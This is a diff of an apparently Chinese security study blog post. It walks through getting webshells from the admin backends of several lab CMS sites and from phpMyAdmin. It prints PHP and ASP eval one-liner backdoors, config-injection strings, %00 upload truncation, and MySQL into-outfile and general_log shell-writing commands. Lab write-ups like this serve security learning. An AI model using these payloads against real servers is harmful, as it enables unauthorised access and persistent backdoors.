@@ -470,14 +470,14 @@ webshell的作用是方便攻击者，webshell是拥有fso权限，根据fs">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    3.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    12 分
                 </div>
                 
 
@@ -537,71 +537,348 @@ webshell的作用是方便攻击者，webshell是拥有fso权限，根据fs">
 <p>后台路径</p>
 <pre class="line-numbers language-none"><code class="language-none">www.cbi1.com/wp-admin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204104306909.png" alt="image-20211204104306909"></p>
+<p><img src="/2021/12/04/day35/image-20211204104306909.png" alt="image-20211204104306909"></p>
 <p>admin 123456 登录进入后台管理</p>
 <h4 id="修改模板getshell"><a href="#修改模板getshell" class="headerlink" title="修改模板getshell"></a>修改模板getshell</h4><p>接下来我们进入 外观 主题 编辑 </p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204104541910.png" alt="image-20211204104541910"></p>
+<p><img src="/2021/12/04/day35/image-20211204104541910.png" alt="image-20211204104541910"></p>
 <p>我们通过写入php一句话方式getshell，看到404模板为php后缀文件，所以我们在此加入一句话会被解析执行。</p>
 <pre class="line-numbers language-none"><code class="language-none">一句话
 &lt;?php phpinfo();eval($_POST['123']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204105007809.png" alt="image-20211204105007809"></p>
+<p><img src="/2021/12/04/day35/image-20211204105007809.png" alt="image-20211204105007809"></p>
 <p>在靶机上我们查看文件发现一句话确实被写入了</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204110538620.png" alt="image-20211204110538620"></p>
+<p><img src="/2021/12/04/day35/image-20211204110538620.png" alt="image-20211204110538620"></p>
 <pre class="line-numbers language-none"><code class="language-none">路径
 www.cbi1.com\wp-content\themes\twentysixteen\404.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>看到phpinfo语句被执行</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204110603509.png" alt="image-20211204110603509"></p>
+<p><img src="/2021/12/04/day35/image-20211204110603509.png" alt="image-20211204110603509"></p>
 <p>用蚁剑也能连接上</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204110806317.png" alt="image-20211204110806317"></p>
+<p><img src="/2021/12/04/day35/image-20211204110806317.png" alt="image-20211204110806317"></p>
 <h4 id="zip自解压getshell"><a href="#zip自解压getshell" class="headerlink" title="zip自解压getshell"></a>zip自解压getshell</h4><p>进入后台管理后，在外观 主题 下发现可上传主题</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204110950993.png" alt="image-20211204110950993"></p>
+<p><img src="/2021/12/04/day35/image-20211204110950993.png" alt="image-20211204110950993"></p>
 <p>在事先准备好的主题下写入一句话，然后压缩为zip格式上传即可</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204111258930.png" alt="image-20211204111258930"></p>
+<p><img src="/2021/12/04/day35/image-20211204111258930.png" alt="image-20211204111258930"></p>
 <p>可看到上传上去了</p>
 <pre class="line-numbers language-none"><code class="language-none">路径
 http://www.cbi1.com/wp-content/themes/moon/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>可看到phpinfo信息</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204111555067.png" alt="image-20211204111555067"></p>
+<p><img src="/2021/12/04/day35/image-20211204111555067.png" alt="image-20211204111555067"></p>
 <p>连接也可成功</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204111636883.png" alt="image-20211204111636883"></p>
+<p><img src="/2021/12/04/day35/image-20211204111636883.png" alt="image-20211204111636883"></p>
 <h3 id="dedecms后台-getshell"><a href="#dedecms后台-getshell" class="headerlink" title="dedecms后台 getshell"></a>dedecms后台 getshell</h3><p>首先还是要进入后台</p>
 <pre class="line-numbers language-none"><code class="language-none">路径
 http://www.cbi2.com/dede/login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204114057624.png" alt="image-20211204114057624"></p>
+<p><img src="/2021/12/04/day35/image-20211204114057624.png" alt="image-20211204114057624"></p>
 <p>admin 123456 进入后台管理</p>
 <h4 id="文件上传-getshell"><a href="#文件上传-getshell" class="headerlink" title="文件上传 getshell"></a>文件上传 getshell</h4><p>进入后台后发现附件管理里有个上传新文件，点击后发现限制了后缀</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204114255073.png" alt="image-20211204114255073"></p>
+<p><img src="/2021/12/04/day35/image-20211204114255073.png" alt="image-20211204114255073"></p>
 <p>然而点击文件式管理器后，发现也可上传文件且没有限制</p>
 <p>我们准备好一句话上传上去</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204114521600.png" alt="image-20211204114521600"></p>
+<p><img src="/2021/12/04/day35/image-20211204114521600.png" alt="image-20211204114521600"></p>
 <pre class="line-numbers language-none"><code class="language-none">路径
 http://www.cbi2.com/uploads/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204114452199.png" alt="image-20211204114452199"></p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204114653835.png" alt="image-20211204114653835"></p>
+<p><img src="/2021/12/04/day35/image-20211204114452199.png" alt="image-20211204114452199"></p>
+<p><img src="/2021/12/04/day35/image-20211204114653835.png" alt="image-20211204114653835"></p>
 <h4 id="修改模板getshell-1"><a href="#修改模板getshell-1" class="headerlink" title="修改模板getshell"></a>修改模板getshell</h4><p>我们在模板 默认模板管理里发现可以修改模板</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204114936335.png" alt="image-20211204114936335"></p>
+<p><img src="/2021/12/04/day35/image-20211204114936335.png" alt="image-20211204114936335"></p>
 <p>但是里面的都是htm后缀，我们如果加入php一句话显然不会被作为php代码解析</p>
 <p>接着我们在生成里发现了更新主页htm，我们可以把主页htm后缀改为php后缀，即可解决一句话不解析的问题</p>
 <p>在index.htm模板里加入一句话</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204120913107.png" alt="image-20211204120913107"></p>
+<p><img src="/2021/12/04/day35/image-20211204120913107.png" alt="image-20211204120913107"></p>
 <p>在生成里更改主页的后缀</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204121003150.png" alt="image-20211204121003150"></p>
+<p><img src="/2021/12/04/day35/image-20211204121003150.png" alt="image-20211204121003150"></p>
 <p>访问index.php，看到一句话被作为php解析了</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204121020685.png" alt="image-20211204121020685"></p>
+<p><img src="/2021/12/04/day35/image-20211204121020685.png" alt="image-20211204121020685"></p>
 <h4 id="任意命令执行getshell"><a href="#任意命令执行getshell" class="headerlink" title="任意命令执行getshell"></a>任意命令执行getshell</h4><p>代码审计后发现此方法</p>
 <p>登录后台后，我们在模块里发现广告管理 增加广告中可以写入代码</p>
 <p>我们写入一句话</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204121556743.png" alt="image-20211204121556743"></p>
+<p><img src="/2021/12/04/day35/image-20211204121556743.png" alt="image-20211204121556743"></p>
 <p>写入了</p>
-<p><img src="/2021/12/04/day35/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211204121714512.png" alt="image-20211204121714512"></p>
+<p><img src="/2021/12/04/day35/image-20211204121714512.png" alt="image-20211204121714512"></p>
 <pre class="line-numbers language-none"><code class="language-none">路径
 http://www.cbi2.com/plus/ad_js.php?aid=5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
+<p>进行连接</p>
+<pre class="line-numbers language-none"><code class="language-none">这里写入的一句话内容
+&lt;?php phpinfo();eval($_POST['123']);?&gt;
+但是无法用蚁剑连接，把post里的引号去掉，发现可以连接了
+&lt;?php phpinfo();eval($_POST[123]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>这里的一句话是写入数据库，所以引号会报错</p>
+</blockquote>
+<p>可以看到拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205131348554.png" alt="image-20211205131348554"></p>
+<p>分析源码 这是在网站里找到的广告调用</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+ *
+ * 广告JS调用方式
+ *
+ * @version        $Id: ad_js.php 1 20:30 2010年7月8日Z $
+ * @package        DedeCMS.Site
+ * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
+ * @license        http://help.dedecms.com/usersguide/license.html
+ * @link           http://www.dedecms.com
+ */</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/../include/common.inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$arcID</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$aid</span> <span class="token operator">=</span> <span class="token variable">$arcID</span><span class="token punctuation">;</span>
+<span class="token variable">$arcID</span> <span class="token operator">=</span> <span class="token variable">$aid</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$aid</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' Request Error! '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cacheFile</span> <span class="token operator">=</span> <span class="token constant">DEDEDATA</span><span class="token operator">.</span><span class="token string single-quoted-string">'/cache/myad-'</span><span class="token operator">.</span><span class="token variable">$aid</span><span class="token operator">.</span><span class="token string single-quoted-string">'.htm'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$nocache</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token variable">$cfg_puccache_time</span> <span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">GetOne</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM `#@__myad` WHERE aid='<span class="token interpolation"><span class="token variable">$aid</span></span>' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timeset'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'normbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$ntime</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ntime</span> <span class="token operator">&gt;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'endtime'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token variable">$ntime</span> <span class="token operator">&lt;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'starttime'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'normbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\"'</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\r"</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\n"</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;!--\r\ndocument.write(\"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$adbody</span><span class="token punctuation">}</span></span>\");\r\n--&gt;\r\n"</span><span class="token punctuation">;</span>
+    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">include</span> <span class="token variable">$cacheFile</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先获取广告aid，若为0返回 request error；</p>
+<p>然后从数据中获取内容拿到catch file 文件里，然后包含进来，这会导致命令执行</p>
+<p>所以我们可以写入一句话getshell</p>
+<h3 id="aspcms后台-getshell"><a href="#aspcms后台-getshell" class="headerlink" title="aspcms后台 getshell"></a>aspcms后台 getshell</h3><p>我们首先进入后台，路径如下</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi3.com/admin_aspcms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>admin 123456进入后台</p>
+<p><img src="/2021/12/04/day35/image-20211205134706714.png" alt="image-20211205134706714"></p>
+<h4 id="修改配置文件getshell"><a href="#修改配置文件getshell" class="headerlink" title="修改配置文件getshell"></a>修改配置文件getshell</h4><p>在后台里，如果可以修改网站配置文件，且没有做过滤，则我们可以写入准备好的语句getshell。</p>
+<p>这里需要注意闭合的问题，因为配置文件在网站中是全局调用，出错的话网站无法访问。</p>
+<p>字符类型闭合和数字闭合依次如下：</p>
+<p>字符型用双引号闭合</p>
+<pre class="line-numbers language-none"><code class="language-none">"%&gt;&lt;%eval request(chr(35))%&gt;&lt;% 
+%&gt;&lt;%eval request(chr(35))%&gt;&lt;%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>接下来我们找没有被过滤的地方</p>
+<p><img src="/2021/12/04/day35/image-20211205141435233.png" alt="image-20211205141435233"></p>
+<p>修改后再config配置文件中查看</p>
+<p><img src="/2021/12/04/day35/image-20211205141538658.png" alt="image-20211205141538658"></p>
+<p>此处不行</p>
+<p>我们又发现了类似于之前的模板修改</p>
+<p><img src="/2021/12/04/day35/image-20211205141716293.png" alt="image-20211205141716293"></p>
+<p>但是后缀为html，我们需要修改后缀，这里需要让后缀为asp，抓包试下</p>
+<p><img src="/2021/12/04/day35/image-20211205141905992.png" alt="image-20211205141905992"></p>
+<p>改为asp后发现出错，这里也不行</p>
+<p><img src="/2021/12/04/day35/image-20211205141942901.png" alt="image-20211205141942901"></p>
+<p>接着我们再扩展功能-幻灯片设置这里，发现这里也是对配置文件进行修改</p>
+<p><img src="/2021/12/04/day35/image-20211205142310658.png" alt="image-20211205142310658"></p>
+<p>接着我们需要找的是没被过滤的地方，尝试后说明文字加双引号也被过滤</p>
+<p>所以我们尝试数字这里，抓包</p>
+<p><img src="/2021/12/04/day35/image-20211205142535447.png" alt="image-20211205142535447"></p>
+<p>我们再这里尝试1后加一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>一句话做url编码</p>
+<p><img src="/2021/12/04/day35/image-20211205142955556.png" alt="image-20211205142955556"></p>
+<p>最后如下</p>
+<pre class="line-numbers language-none"><code class="language-none">slidestyle=1%25&gt;&lt;%25eval+request(chr(35))%25&gt;&lt;%25<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们查看靶机的配置文件</p>
+<p><img src="/2021/12/04/day35/image-20211205143129585.png" alt="image-20211205143129585"></p>
+<p><img src="/2021/12/04/day35/image-20211205143351022.png" alt="image-20211205143351022"></p>
+<p>连接地址</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi3.com/config/AspCms_Config.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205143409093.png" alt="image-20211205143409093"></p>
+<h3 id="南方数据企业系统getshell"><a href="#南方数据企业系统getshell" class="headerlink" title="南方数据企业系统getshell"></a>南方数据企业系统getshell</h3><p>先进入后台，</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi7.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211205143627058.png" alt="image-20211205143627058"></p>
+<p>admin 123456进入</p>
+<p><img src="/2021/12/04/day35/image-20211205143650958.png" alt="image-20211205143650958"></p>
+<h4 id="上传截断getshell"><a href="#上传截断getshell" class="headerlink" title="上传截断getshell"></a>上传截断getshell</h4><p>这里找是否能直接上传脚本文件</p>
+<p><img src="/2021/12/04/day35/image-20211205144348110.png" alt="image-20211205144348110"></p>
+<p>看到这里有个上传点</p>
+<p>直接上传asp脚本文件</p>
+<p><img src="/2021/12/04/day35/image-20211205144718721.png" alt="image-20211205144718721"></p>
+<p>防止体量太小前面加点字符</p>
+<p>一句话</p>
+<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval request("123")%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>直接上传asp文件发现不允许上传</p>
+<p><img src="/2021/12/04/day35/image-20211205144836780.png" alt="image-20211205144836780"></p>
+<p>但是我们在这里发现，上传时可以选择目录路径，猜测它上传时放到目录下，我们这里想必可以使用%00截断来上传asp文件</p>
+<p><img src="/2021/12/04/day35/image-20211205144916360.png" alt="image-20211205144916360"></p>
+<p>首先修改文件名称</p>
+<p><img src="/2021/12/04/day35/image-20211205145124183.png" alt="image-20211205145124183"></p>
+<p>然后修改目录路径做%00截断，截断后仍作为asp格式上传上去</p>
+<p><img src="/2021/12/04/day35/image-20211205145311787.png" alt="image-20211205145311787"></p>
+<p>做了url decode后</p>
+<p><img src="/2021/12/04/day35/image-20211205145338867.png" alt="image-20211205145338867"></p>
+<p>可以看到成功上传了</p>
+<p><img src="/2021/12/04/day35/image-20211205145417792.png" alt="image-20211205145417792"></p>
+<p>上传路径也显示出来了</p>
+<pre class="line-numbers language-none"><code class="language-none">http://www.cbi7.com/Upload/PicFiles/2.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205145648721.png" alt="image-20211205145648721"></p>
+<h4 id="修改配置文件getshell-1"><a href="#修改配置文件getshell-1" class="headerlink" title="修改配置文件getshell"></a>修改配置文件getshell</h4><p>这里我们也在找找这种方法getshell</p>
+<p>我们在系统管理-网站信息设置里</p>
+<p><img src="/2021/12/04/day35/image-20211205151555992.png" alt="image-20211205151555992"></p>
+<p>发现单引号不会出错，双引号内部服务器出错</p>
+<p>但是这里我们需要用双引号闭合</p>
+<p><img src="/2021/12/04/day35/image-20211205151851951.png" alt="image-20211205151851951"></p>
+<p>我们构造一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">"%&gt;&lt;%eval request(chr(35))%&gt;&lt;%s="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>“闭合前面的”</p>
+<p>%&gt;闭合前面的&lt;%</p>
+<p>中间写入asp一句话</p>
+<p>&lt;%闭合后面的%&gt;</p>
+<p>s=”闭合后面的”</p>
+<p><img src="/2021/12/04/day35/image-20211205153113289.png" alt="image-20211205153113289"></p>
+<p>虽然双引号闭合报内部服务器错误，但是我们用蚁剑连接发现可以连接</p>
+<p>连接路径</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi7.com/Inc/Const.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205153435344.png" alt="image-20211205153435344"></p>
+<p>我们在系统管理-常量设置，找到了系统的配置文件修改，这里显然也可插入一句话</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%eval request(chr(35))%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211205153733141.png" alt="image-20211205153733141"></p>
+<p>直接再最后加入一句话</p>
+<p>因为修改的是同一个常量文件，所以还是上面的路径</p>
+<p>连接拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205153856792.png" alt="image-20211205153856792"></p>
+<h3 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h3><p>我们打开phpstudy，安装phpmyadmin，登录phpmyadmin</p>
+<h4 id="执行sql命令-getshell"><a href="#执行sql命令-getshell" class="headerlink" title="执行sql命令 getshell"></a>执行sql命令 getshell</h4><p>登录phpmyadmin后，我们可以使用into outfile写入后门</p>
+<pre class="line-numbers language-none"><code class="language-none">select '&lt;?php phpinfo();eval($_POST[123]);?&gt;' into outfile 'D:/phpstudy_pro/WWW/www.k123.com/x.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>必须写入网站目录下，一句话后门才能被解析</p>
+<p><img src="/2021/12/04/day35/image-20211206140346154.png" alt="image-20211206140346154"></p>
+<p>命令无法执行因为在安装MySQL的时候限制了导入与导出的目录权限。只允许在规定的目录下才能导入，需要修改mysql配置文件</p>
+<p>我们可以去掉导入的目录限制，再mysql配置文件中加入</p>
+<pre class="line-numbers language-none"><code class="language-none">secure_file_priv =<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206141119198.png" alt="image-20211206141119198"></p>
+<p>修改后重启mysql命令即可执行</p>
+<p><img src="/2021/12/04/day35/image-20211206141157093.png" alt="image-20211206141157093"></p>
+<p>可以再网站根目录下看到确实写入了</p>
+<p><img src="/2021/12/04/day35/image-20211206141253499.png" alt="image-20211206141253499"></p>
+<p><img src="/2021/12/04/day35/image-20211206141310856.png" alt="image-20211206141310856"></p>
+<p>成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206141345792.png" alt="image-20211206141345792"></p>
+<h4 id="mysql日志文件getshell"><a href="#mysql日志文件getshell" class="headerlink" title="mysql日志文件getshell"></a>mysql日志文件getshell</h4><p>我们利用mysql的日志文件写入shell，这个日志文件可以通过phpmyadmin，修改他的存放位置和后缀</p>
+<p>首先我们再phpmyadmin中开启日志记录</p>
+<pre class="line-numbers language-none"><code class="language-none">SET global general_log = "ON";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206143401203.png" alt="image-20211206143401203"></p>
+<p>我们可以在常量处查看是否修改</p>
+<p><img src="/2021/12/04/day35/image-20211206143527364.png" alt="image-20211206143527364"></p>
+<p>然后我们给日志一个保存路径，并且附加后缀</p>
+<p>保存好原有路径，测试完后改回去</p>
+<pre class="line-numbers language-none"><code class="language-none">D:\phpstudy_pro\Extensions\MySQL5.7.26\data\WIN-GB0DQ04MBCM.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">SET global general_log_file ='D:/phpstudy_pro/WWW/www.k123.com/a.php';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206143613853.png" alt="image-20211206143613853"></p>
+<p>然后我们搜索一句话会被日志记录下来</p>
+<pre class="line-numbers language-none"><code class="language-none">select '&lt;?php phpinfo();eval($_POST[123]);?&gt;'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206143630319.png" alt="image-20211206143630319"></p>
+<p><img src="/2021/12/04/day35/image-20211206143702026.png" alt="image-20211206143702026"></p>
+<p>可以看到日志记录在了网站目录下，并且我们查询的一句话被记录下了</p>
+<p>此时我们的一句话后门就会被解析</p>
+<p><img src="/2021/12/04/day35/image-20211206143756850.png" alt="image-20211206143756850"></p>
+<p>并且成功getshell</p>
+<p><img src="/2021/12/04/day35/image-20211206143826077.png" alt="image-20211206143826077"></p>
+<h3 id="pageadmin-getshell"><a href="#pageadmin-getshell" class="headerlink" title="pageadmin getshell"></a>pageadmin getshell</h3><p>还是先登录后台管理，</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi9.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211206144711456.png" alt="image-20211206144711456"></p>
+<p>admin 123456进入</p>
+<p><img src="/2021/12/04/day35/image-20211206144735476.png" alt="image-20211206144735476"></p>
+<h4 id="上传模块getshell"><a href="#上传模块getshell" class="headerlink" title="上传模块getshell"></a>上传模块getshell</h4><p>进入后台后，我们首先在工具-文件管理处寻找，</p>
+<p><img src="/2021/12/04/day35/image-20211206145259379.png" alt="image-20211206145259379"></p>
+<p>这里我们发现可以改名，我们尝试后发现不能修改为php、asp等的后缀名，做了限制</p>
+<p>然后我们在功能中发现了上传文件</p>
+<p><img src="/2021/12/04/day35/image-20211206145410768.png" alt="image-20211206145410768"></p>
+<p>经尝试发现不能上传php、asp后缀文件</p>
+<p>功能中还有个模板安装，允许上传zip格式文件</p>
+<p><img src="/2021/12/04/day35/image-20211206145538460.png" alt="image-20211206145538460"></p>
